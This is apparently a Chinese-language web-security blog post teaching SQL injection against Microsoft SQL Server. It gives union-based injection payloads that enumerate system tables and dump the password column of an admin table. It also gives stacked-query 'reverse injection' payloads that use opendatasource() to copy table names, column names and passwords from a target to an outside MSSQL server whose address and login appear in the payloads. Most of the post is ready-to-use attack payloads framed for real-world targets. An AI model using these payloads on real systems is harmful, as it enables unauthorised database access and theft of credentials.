MSSQL注入
Created 2020-05-18| Updated 2020-06-17|WEB安全
Post View:

MSSQL（sql server）和MySQL一样，是一个数据库平台，只不过它不是开源的

MSSQL显错注入

MSSQL显错注入的判定方式与MySQL一样，只是在使用联合查询语句的时候有些差别。
当我们确定字段数之后，在MySQL中使用联合查询时可以用数字代替字段，比如union select 1,2,3但是在MSSQL中，却不能这么实用，MSSQL的语法要比MySQL严谨一些，比如union all select null,null,null,union后要加ALL，数字也要用NULL代替，这是因为在MSSQL中对于字段的类型要求比较严格，需要在对应的类型,
可以看到，第一个字段是数字类型，2和3字段是字符串类型。
有了显示位，就可以查询数据表和字段了。
在本地测试，查询数据库中的系统表，select*from sysobjects
可以看到用户创建的表的类型是U,所以当我们要查询用户所创建的表时，只需要加上where条件即可
但是在联合查询的时候只是想要表的名字，所以只需要select name from sysobjects where xtype='u'即可)
现在知道了表名，想要查询字段，就要用到一个新的语句select*from syscolumns
可以看到同一个表里的字段id值是一样的，那么我们就可以通过不同的id值来获取不同表里的字段名select name from syscolumns where id=245575913
回到实战，已知有三个表名，在查询在意表名对应的id值，就可以获取字段了
admin表里的字段union all select 1,name,null from syscolumns where id=1977058079
获取password字段的内容union all select null,passwd,null from admin同样的方法获取其他字段的内容

反弹注入

有SQL注入点，但是却无法进行注入，注射工具的拆解速度慢，错误提示信息关闭，不能返回注入的结果，这时可以尝试反弹注入
条件
反弹注入其实就是把查询出来的数据发送到我们自己的MSSQL服务器上，所以需要拥有一个属于自己的MSSQL服务器和公网ip
反弹注入因为要使用到insert into 语句，所以需要网站存在堆叠注入的时候才可以使用，需要使用到一个opendatasource()函数
opendatasource(provider_name,init_string)
provider_name:注册为用于访问数据源的OLE DB提供程序的名称，MSSQL默认为sqloledb
init_string：连接地址，其中有（server=链接地址，端口；uid=用户名；pwd=密码；database=数据库名）
构建语句：insert into opendatasource(‘sqloledb’,’server=SQL5006.webweb.com,1433;uid=DB_14D9310_feng_admin;pwd=12345678;database=DB_14D9310_feng’).DB_14D9310_feng.dbo.one+数据库查询语句
条件
查询的字段数要与本地表中的字段数相同，我现在要查询id与那么字段，那么数据库中one表中的字段只能是两个。
获取表名及id值insert into opendatasource(‘sqloledb’,’server=SQL5006.webweb.com,1433;uid=DB_14D9310_feng_admin;pwd=12345678;database=DB_14D9310_feng’).DB_14D9310_feng.dbo.one select id,name from sysobjects where xtype='u'
获取字段名insert into opendatasource('sqloledb','server=SQL5006.webweb.com,1433;uid=DB_14D9310_feng_admin;pwd=12345678;database=DB_14D9310_feng').DB_14D9310_feng.dbo.one select id,name from syscolumns where id=1977058079

获取字段内容insert into opendatasource('sqloledb','server=SQL5006.webweb.com,1433;uid=DB_14D9310_feng_admin;pwd=12345678;database=DB_14D9310_feng').DB_14D9310_feng.dbo.one select id,passwd from admin

其他内容可通过同样的方式获取
